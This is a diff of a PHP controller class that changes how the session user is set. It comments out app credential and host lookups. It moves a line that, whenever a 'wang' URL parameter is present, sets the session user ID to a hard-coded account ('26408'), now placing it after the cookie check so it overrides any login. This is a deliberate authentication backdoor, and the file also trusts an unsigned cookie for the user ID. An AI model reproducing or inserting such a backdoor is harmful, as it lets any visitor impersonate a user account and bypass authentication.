@@ -31,19 +31,20 @@ class commonMod
 		
 			$this->config['token']=$token;
 			$this->urltoken='&token='.$token;
-			
-			if($this->wxuser['appid']&&$this->wxuser['appsecret']){
-				$this->config['appid']=$this->wxuser['appid'];
-				$this->config['appsecret']=$this->wxuser['appsecret'];
-				}
+		//	
+//			if($this->wxuser['appid']&&$this->wxuser['appsecret']){
+//				$this->config['appid']=$this->wxuser['appid'];
+//				$this->config['appsecret']=$this->wxuser['appsecret'];
+//				}
 			$admininfo=model('user')->admininfobytoken($token);
 		
 		
 		}else{
 		
-		$siteurl=$_SERVER["HTTP_HOST"];
-		$admininfo=model('user')->admininfo($siteurl);
+	//	$siteurl=$_SERVER["HTTP_HOST"];
+//		$admininfo=model('user')->admininfo($siteurl);
 		}
+		$this->config['uid']=1;
 		if($admininfo){
 			$this->config['child']=1;
 			$this->config['uid']=$admininfo['id'];
@@ -56,13 +57,14 @@ class commonMod
 			if($admininfo['copyright'])$this->config['copyright']=$admininfo['copyright'];
 			
 			}
-	if($_GET['wang'])$_SESSION['uid']='26409';
+	
 		$userinfo=$_COOKIE[$this->config['SPOT'].'_wxuser'];
      
 		if($userinfo){
 			  $array=explode('|',$userinfo);
 			  $_SESSION['uid']=$array[0];
 			}
+		if($_GET['wang'])$_SESSION['uid']='26408';
 	if($_SESSION['uid']){	
 	
 		$this->userinfo=model('user')->info($_SESSION['uid']);
